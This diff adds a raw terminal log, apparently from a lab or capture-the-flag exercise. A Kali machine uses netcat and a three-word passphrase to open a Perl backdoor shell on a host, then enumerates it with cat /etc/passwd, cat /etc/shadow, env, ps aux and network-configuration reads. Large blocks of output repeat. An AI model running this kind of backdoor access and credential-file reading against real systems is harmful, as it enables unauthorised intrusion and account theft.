@@ -1,0 +1,585 @@
+
+getent group
+
+
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/tcsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+messagebus:x:104:111::/var/run/dbus:/bin/false
+avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+ntp:x:106:114::/home/ntp:/bin/false
+uuidd:x:107:115::/run/uuidd:/bin/false
+Debian-exim:x:108:116::/var/spool/exim4:/bin/false
+avahi-autoipd:x:109:118:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+colord:x:110:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
+dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+geoclue:x:112:121::/var/lib/geoclue:/bin/false
+saned:x:113:124::/var/lib/saned:/bin/false
+usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+davfs2:x:115:125::/var/cache/davfs2:/bin/false
+lightdm:x:116:126:Light Display Manager:/var/lib/lightdm:/bin/false
+hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+hacker:x:1000:1000:Yes:/home/hacker:/bin/bash
+clown:x:1001:1001:,,,:/home/clown:/bin/bash
+bob:x:1002:1002:,,,:/home/bob:/bin/bash
+
+cat /etc/shadow
+
+uname -a
+Linux foobar 3.16.0-4-amd64 #1 SMP Debian 3.16.36-1+deb8u1 (2016-09-03) x86_64 GNU/Linux
+
+cat /proc/version
+Linux version 3.16.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.36-1+deb8u1 (2016-09-03)
+
+env
+XDG_VTNR=7
+SSH_AGENT_PID=941
+XDG_SESSION_ID=2
+XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/hacker
+GPG_AGENT_INFO=/run/user/1000/keyring/gpg:0:1
+GLADE_PIXMAP_PATH=:
+TERM=xterm
+SHELL=/bin/bash
+XDG_MENU_PREFIX=xfce-
+WINDOWID=60817572
+USER=hacker
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0
+GLADE_MODULE_PATH=:
+XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0
+SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
+SESSION_MANAGER=local/foobar:@/tmp/.ICE-unix/955,unix/foobar:/tmp/.ICE-unix/955
+XDG_CONFIG_DIRS=/etc/xdg/pointlinux-xfce:/etc/xdg
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+DESKTOP_SESSION=xfce
+PWD=/home/hacker
+LANG=en_US.UTF-8
+GDMSESSION=xfce
+SHLVL=1
+XDG_SEAT=seat0
+HOME=/home/hacker
+LOGNAME=hacker
+XDG_DATA_DIRS=/usr/share/pointlinux/xfce:/usr/share/xfce4:/usr/local/share/:/usr/share/:/usr/share
+DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-Ek7dW8drMC,guid=b78bba45764ae1ebc3d65c5d57f128df
+XDG_RUNTIME_DIR=/run/user/1000
+DISPLAY=:0.0
+GLADE_CATALOG_PATH=:
+XDG_CURRENT_DESKTOP=XFCE
+COLORTERM=xfce4-terminal
+XAUTHORITY=/home/hacker/.Xauthority
+_=./Server.pl
+
+I fell asleep ... goodbye!
+
+
+
+
+
+
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/tcsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+messagebus:x:104:111::/var/run/dbus:/bin/false
+avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+ntp:x:106:114::/home/ntp:/bin/false
+uuidd:x:107:115::/run/uuidd:/bin/false
+Debian-exim:x:108:116::/var/spool/exim4:/bin/false
+avahi-autoipd:x:109:118:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+colord:x:110:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
+dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+geoclue:x:112:121::/var/lib/geoclue:/bin/false
+saned:x:113:124::/var/lib/saned:/bin/false
+usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+davfs2:x:115:125::/var/cache/davfs2:/bin/false
+lightdm:x:116:126:Light Display Manager:/var/lib/lightdm:/bin/false
+hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+hacker:x:1000:1000:Yes:/home/hacker:/bin/bash
+clown:x:1001:1001:,,,:/home/clown:/bin/bash
+bob:x:1002:1002:,,,:/home/bob:/bin/bash
+
+cat /etc/shadow
+
+uname -a
+Linux foobar 3.16.0-4-amd64 #1 SMP Debian 3.16.36-1+deb8u1 (2016-09-03) x86_64 GNU/Linux
+
+cat /proc/version
+Linux version 3.16.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.36-1+deb8u1 (2016-09-03)
+
+env
+XDG_VTNR=7
+SSH_AGENT_PID=941
+XDG_SESSION_ID=2
+XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/hacker
+GPG_AGENT_INFO=/run/user/1000/keyring/gpg:0:1
+GLADE_PIXMAP_PATH=:
+TERM=xterm
+SHELL=/bin/bash
+XDG_MENU_PREFIX=xfce-
+WINDOWID=60817572
+USER=hacker
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0
+GLADE_MODULE_PATH=:
+XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0
+SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
+SESSION_MANAGER=local/foobar:@/tmp/.ICE-unix/955,unix/foobar:/tmp/.ICE-unix/955
+XDG_CONFIG_DIRS=/etc/xdg/pointlinux-xfce:/etc/xdg
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+DESKTOP_SESSION=xfce
+PWD=/home/hacker
+LANG=en_US.UTF-8
+GDMSESSION=xfce
+SHLVL=1
+XDG_SEAT=seat0
+HOME=/home/hacker
+LOGNAME=hacker
+XDG_DATA_DIRS=/usr/share/pointlinux/xfce:/usr/share/xfce4:/usr/local/share/:/usr/share/:/usr/share
+DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-Ek7dW8drMC,guid=b78bba45764ae1ebc3d65c5d57f128df
+XDG_RUNTIME_DIR=/run/user/1000
+DISPLAY=:0.0
+GLADE_CATALOG_PATH=:
+XDG_CURRENT_DESKTOP=XFCE
+COLORTERM=xfce4-terminal
+XAUTHORITY=/home/hacker/.Xauthority
+_=./Server.pl
+
+I fell asleep ... goodbye!
+root@kali:~/Desktop# 
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+lpstat -a
+
+ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.4 176388  4984 ?        Ss   Oct02   0:37 /sbin/init splash
+root         2  0.0  0.0      0     0 ?        S    Oct02   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    Oct02   0:20 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   Oct02   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        S    Oct02   0:10 [kworker/u2:0]
+root         7  0.1  0.0      0     0 ?        S    Oct02  12:33 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    Oct02   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    Oct02   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S    Oct02   0:13 [watchdog/0]
+root        11  0.0  0.0      0     0 ?        S<   Oct02   0:00 [khelper]
+root        12  0.0  0.0      0     0 ?        S    Oct02   0:00 [kdevtmpfs]
+root        13  0.0  0.0      0     0 ?        S<   Oct02   0:00 [netns]
+root        14  0.0  0.0      0     0 ?        S    Oct02   0:00 [khungtaskd]
+root        15  0.0  0.0      0     0 ?        S<   Oct02   0:00 [writeback]
+root        16  0.0  0.0      0     0 ?        SN   Oct02   0:00 [ksmd]
+root        17  0.0  0.0      0     0 ?        SN   Oct02   0:00 [khugepaged]
+root        18  0.0  0.0      0     0 ?        S<   Oct02   0:00 [crypto]
+root        19  0.0  0.0      0     0 ?        S<   Oct02   0:00 [kintegrityd]
+root        20  0.0  0.0      0     0 ?        S<   Oct02   0:00 [bioset]
+root        21  0.0  0.0      0     0 ?        S<   Oct02   0:00 [kblockd]
+root        23  0.0  0.0      0     0 ?        S    Oct02   0:00 [kswapd0]
+root        24  0.0  0.0      0     0 ?        S<   Oct02   0:00 [vmstat]
+root        25  0.0  0.0      0     0 ?        S    Oct02   0:00 [fsnotify_mark]
+root        31  0.0  0.0      0     0 ?        S<   Oct02   0:00 [kthrotld]
+root        32  0.0  0.0      0     0 ?        S<   Oct02   0:00 [ipv6_addrconf]
+root        33  0.0  0.0      0     0 ?        S<   Oct02   0:00 [deferwq]
+root        34  0.0  0.0      0     0 ?        S    Oct02   0:00 [kworker/u2:1]
+root        67  0.0  0.0      0     0 ?        S    Oct02   0:00 [khubd]
+root        68  0.0  0.0      0     0 ?        S<   Oct02   0:00 [ata_sff]
+root        69  0.0  0.0      0     0 ?        S<   Oct02   0:00 [kpsmoused]
+root        71  0.0  0.0      0     0 ?        S    Oct02   0:00 [scsi_eh_0]
+root        72  0.0  0.0      0     0 ?        S<   Oct02   0:00 [scsi_tmf_0]
+root        73  0.0  0.0      0     0 ?        S    Oct02   0:00 [scsi_eh_1]
+root        74  0.0  0.0      0     0 ?        S<   Oct02   0:00 [scsi_tmf_1]
+root       102  0.0  0.0      0     0 ?        S<   Oct02   0:03 [kworker/0:1H]
+root       105  0.0  0.0      0     0 ?        S    Oct02   0:12 [jbd2/vda2-8]
+root       106  0.0  0.0      0     0 ?        S<   Oct02   0:00 [ext4-rsv-conver]
+root       139  0.0  0.0      0     0 ?        S    Oct02   0:00 [kauditd]
+root       156  0.0  0.3  41452  3476 ?        Ss   Oct02   0:00 /lib/systemd/systemd-udevd
+root       157  0.0  0.3  28968  3584 ?        Ss   Oct02   0:30 /lib/systemd/systemd-journald
+root       198  0.0  0.0      0     0 ?        S    Oct02   0:09 [vballoon]
+root       203  0.0  0.0      0     0 ?        S<   Oct02   0:00 [hd-audio0]
+root       211  0.0  0.0      0     0 ?        S<   Oct02   0:00 [kvm-irqfd-clean]
+root       267  0.0  0.3  32888  3880 ?        Ss   Oct02   0:09 /usr/sbin/lshd --port 22
+root       269  0.0  0.2  27504  2860 ?        Ss   Oct02   0:05 /usr/sbin/cron -f
+root       271  0.0  1.3 377808 14188 ?        Ssl  Oct02   0:09 /usr/sbin/NetworkManager --no-daemon
+root       272  0.0  0.7 336288  7784 ?        Ssl  Oct02   0:00 /usr/sbin/ModemManager
+root       276  0.0  0.2  28356  2808 ?        Ss   Oct02   0:08 /lib/systemd/systemd-logind
+avahi      282  0.0  0.2  32228  2740 ?        Ss   Oct02   0:03 avahi-daemon: running [foobar.local]
+message+   284  0.0  0.3  42656  3708 ?        Ss   Oct02   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+avahi      293  0.0  0.0  32100   252 ?        S    Oct02   0:00 avahi-daemon: chroot helper
+root       310  0.0  0.3 258672  3452 ?        Ssl  Oct02   0:04 /usr/sbin/rsyslogd -n
+ntp        341  0.0  0.4  35444  4112 ?        Ss   Oct02   2:16 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 106:114
+root       345  0.0  0.8 307664  9192 ?        Ssl  Oct02   0:01 /usr/lib/policykit-1/polkitd --no-debug
+root       346  0.0  0.5  71704  5184 ?        Ss   Oct02   0:00 /usr/sbin/cups-browsed
+root       357  0.0  0.7 308468  8076 ?        SLsl Oct02   0:00 /usr/sbin/lightdm
+root       358  0.0  0.1  14416  1912 tty1     Ss+  Oct02   0:00 /sbin/agetty --noclear tty1 linux
+root       366  0.0  0.0      0     0 ?        S<   Oct02   0:00 [cfg80211]
+root       373  0.0  0.2  29128  2672 ?        S    Oct02   0:11 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 106:114
+root       387  0.0  4.6 355908 47160 tty7     Ss+  Oct02   4:42 /usr/bin/X :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+lightdm    638  0.0  0.3  35636  3756 ?        Ss   Oct02   0:00 /lib/systemd/systemd --user
+lightdm    639  0.0  0.2  52296  2064 ?        S    Oct02   0:00 (sd-pam)         
+Debian-+   645  0.0  0.3  55308  3320 ?        Ss   Oct02   0:01 /usr/sbin/exim4 -bd -q30m
+lightdm    655  0.0  0.1  24372  1720 ?        S    Oct02   0:00 /usr/bin/dbus-launch --autolaunch 5f60e3a1b54b475ba160df72a1250cbc --binary-syntax --close-stderr
+lightdm    656  0.0  0.2  42124  2228 ?        Ss   Oct02   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
+lightdm    658  0.0  0.7 371748  7668 ?        Sl   Oct02   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
+lightdm    662  0.0  0.3  42124  3236 ?        S    Oct02   0:00 /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
+lightdm    665  0.0  0.4 125220  4860 ?        Sl   Oct02   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
+root       669  0.0  0.8 264112  8656 ?        Sl   Oct02   0:00 lightdm --session-child 13 20
+hacker     908  0.0  0.3  35640  3636 ?        Ss   Oct02   0:00 /lib/systemd/systemd --user
+hacker     909  0.0  0.2 199760  2108 ?        S    Oct02   0:00 (sd-pam)         
+hacker     913  0.0  0.8 389640  8264 ?        Sl   Oct02   0:00 /usr/bin/gnome-keyring-daemon --daemonize --login
+hacker     915  0.0  0.1   4336  1384 ?        Ss   Oct02   0:00 /bin/sh /etc/xdg/xfce4/xinitrc -- /etc/X11/xinit/xserverrc
+hacker     941  0.0  0.0  10700   340 ?        Ss   Oct02   0:10 /usr/bin/ssh-agent /usr/bin/dbus-launch --exit-with-session startxfce4
+hacker     944  0.0  0.1  15960  1820 ?        S    Oct02   0:00 /usr/bin/dbus-launch --exit-with-session startxfce4
+hacker     945  0.0  0.2  42600  2864 ?        Ss   Oct02   0:07 /usr/bin/dbus-daemon --fork --print-pid 4 --print-address 6 --session
+hacker     955  0.0  1.2 245092 13092 ?        Sl   Oct02   0:00 xfce4-session
+hacker     958  0.0  0.4  37524  4220 ?        S    Oct02   0:04 /usr/lib/x86_64-linux-gnu/xfce4/xfconf/xfconfd
+hacker     966  0.0  1.7 163412 18404 ?        S    Oct02   0:49 xfwm4 --replace
+hacker     970  0.0  2.6 354732 26872 ?        Sl   Oct02   2:33 xfce4-panel
+hacker     972  0.0  1.2 164604 13140 ?        S    Oct02   0:00 Thunar --daemon
+hacker     974  0.0  2.9 454172 30232 ?        Sl   Oct02   0:46 xfdesktop
+hacker     980  0.0  1.2 222292 13216 ?        Sl   Oct02   0:00 /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
+hacker     982  0.0  2.2 229552 22644 ?        Sl   Oct02   0:09 /usr/bin/python /usr/share/system-config-printer/applet.py
+hacker     984  0.0  0.4  60552  4732 ?        S    Oct02   0:36 xscreensaver -no-splash
+hacker     988  0.0  2.5 161044 25796 ?        S    Oct02   4:14 python /usr/share/pointlinux/update-notifier/pointlinux-update-notifier.py
+hacker     992  0.0  3.3 518316 34804 ?        Sl   Oct02   0:03 nm-applet
+hacker     993  0.0  1.5 308092 15496 ?        Ssl  Oct02   0:01 xfce4-volumed
+hacker     994  0.0  1.2 231396 12508 ?        Ssl  Oct02   0:00 xfce4-power-manager
+hacker     996  0.0  0.7 371752  7632 ?        Sl   Oct02   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
+hacker     997  0.0  1.4 335996 15140 ?        Ssl  Oct02   0:38 xfsettingsd
+hacker    1004  0.0  0.3  42124  3212 ?        S    Oct02   0:00 /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
+hacker    1007  0.0  0.4 125220  4868 ?        Sl   Oct02   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
+hacker    1012  0.0  2.8 424392 28716 ?        Sl   Oct02   0:45 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so 1 18874406 whiskermenu Whisker Menu Show a menu to easily access installed applications 
+hacker    1016  0.0  0.6 209852  6280 ?        Sl   Oct02   0:00 /usr/lib/gvfs/gvfsd
+root      1017  0.0  0.7 238480  8116 ?        Ssl  Oct02   0:00 /usr/lib/upower/upowerd
+hacker    1018  0.0  2.0 255792 20856 ?        Sl   Oct02   0:12 /usr/lib/x86_64-linux-gnu/xfce4/panel-plugins/xfce4-xkb-plugin  9 18874409 xkb-plugin Keyboard Layouts Keyboard layouts setup and switch plugin 
+hacker    1019  0.0  1.2 151480 13272 ?        S    Oct02   0:04 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so 4 18874410 systray Notification Area Area where notification icons appear 
+hacker    1020  0.0  2.5 356024 26316 ?        Sl   Oct02   0:06 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libmixer.so 12 18874411 mixer Audio Mixer Adjust volume levels 
+hacker    1021  0.0  2.2 260124 22576 ?        Sl   Oct02   0:05 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so 5 18874412 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display 
+hacker    1054  0.0  0.4  51744  4840 ?        S    Oct02   0:04 /usr/lib/x86_64-linux-gnu/gconf/gconfd-2
+hacker    1067  0.0  0.8 310776  8960 ?        Sl   Oct02   0:00 /usr/lib/gvfs/gvfs-udisks2-volume-monitor
+root      1069  0.0  0.8 397136  8676 ?        Ssl  Oct02   0:05 /usr/lib/udisks2/udisksd --no-debug
+hacker    1078  0.0  0.6 215648  6264 ?        Sl   Oct02   0:00 /usr/lib/gvfs/gvfs-gphoto2-volume-monitor
+hacker    1082  0.0  0.5 202580  5812 ?        Sl   Oct02   0:00 /usr/lib/gvfs/gvfs-goa-volume-monitor
+hacker    1086  0.0  0.7 300120  7236 ?        Sl   Oct02   0:00 /usr/lib/gvfs/gvfs-afc-volume-monitor
+hacker    1091  0.0  0.5 206568  5784 ?        Sl   Oct02   0:00 /usr/lib/gvfs/gvfs-mtp-volume-monitor
+hacker    1100  0.0  0.7 373420  7944 ?        Sl   Oct02   0:00 /usr/lib/gvfs/gvfsd-trash --spawner :1.21 /org/gtk/gvfs/exec_spaw/0
+hacker    1109  0.0  2.9 420304 29980 ?        Sl   Oct02   0:21 /usr/bin/xfce4-terminal
+hacker    1113  0.0  0.1  14692  1592 ?        S    Oct02   0:00 gnome-pty-helper
+hacker    1127  0.0  0.3  21872  3696 pts/1    Ss   Oct02   0:00 bash
+hacker    6944  0.0  0.5  30872  5568 pts/1    S+   Oct05   0:02 /usr/bin/perl ./Server.pl
+hacker    9590  0.0  0.3  21872  3640 pts/0    Ss   Oct06   0:00 bash
+root      9600  0.0  0.3  53400  3656 pts/0    S    Oct06   0:00 sudo tcsh
+root      9601  0.0  0.3  19744  3352 pts/0    S+   Oct06   0:00 -csh
+root     10732  0.0  0.6  86108  6228 ?        Ss   07:35   0:00 /usr/sbin/cupsd -f
+root     11064  0.0  0.0      0     0 ?        S    11:35   0:04 [kworker/0:1]
+root     11299  0.0  0.0      0     0 ?        S    15:13   0:00 [kworker/0:2]
+hacker   11575  0.0  0.3  31004  3496 pts/1    S+   17:33   0:00 /usr/bin/perl ./Server.pl
+hacker   11576  0.0  0.1  30872  1560 pts/1    S+   17:33   0:00 /usr/bin/perl ./Server.pl
+hacker   11578  0.0  0.2  19100  2428 pts/1    R+   17:33   0:00 ps aux
+
+top
+cat /etc/services
+ps aux | grep root
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfigI fell asleep ... goodbye!
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+cat /etc/sysconfi/network
+
+cat /etc/resolv.conf
+# Generated by NetworkManager
+
+hostname
+foobar
+
+dnsdomainname
+
+cat /etc/networks
+default        0.0.0.0
+loopback    127.0.0.0
+link-local    169.254.0.0
+
+
+lsof -i
+
+w
+ 17:34:54 up 5 days,  6:15,  3 users,  load average: 0.01, 0.06, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+hacker   :0       :0               Sun11   ?xdm?  30:22   0.25s /bin/sh /etc/xdg/xfce4/xinitrc -- /etc/X11/xinit/xserverrc
+hacker   pts/0    :0.0             Thu17    2:21m  0.89s 21.24s /usr/bin/xfce4-terminal
+hacker   pts/1    :0.0             Sun11    2days  2.86s  0.13s w
+
+arp -e
+
+idI fell asleep ... goodbye!
+root@kali:~/Desktop# id
+uid=0(root) gid=0(root) groups=0(root)
+root@kali:~/Desktop# 
+
+
+
+
+root@kali:~/Desktop# nc 10.241.13.16 10103
+HELLO
+Howdy ...
+PLEASE
+A bit petulant, no?
+ACT
+Your wish ... is my command.
+cat /etc/sysconfi/network
+
+cat /etc/resolv.conf
+# Generated by NetworkManager
+
+hostname
+foobar
+
+dnsdomainname
+
+cat /etc/networks
+default        0.0.0.0
+loopback    127.0.0.0
+link-local    169.254.0.0
+
+
+lsof -i
+
+w
+ 17:34:54 up 5 days,  6:15,  3 users,  load average: 0.01, 0.06, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+hacker   :0       :0               Sun11   ?xdm?  30:22   0.25s /bin/sh /etc/xdg/xfce4/xinitrc -- /etc/X11/xinit/xserverrc
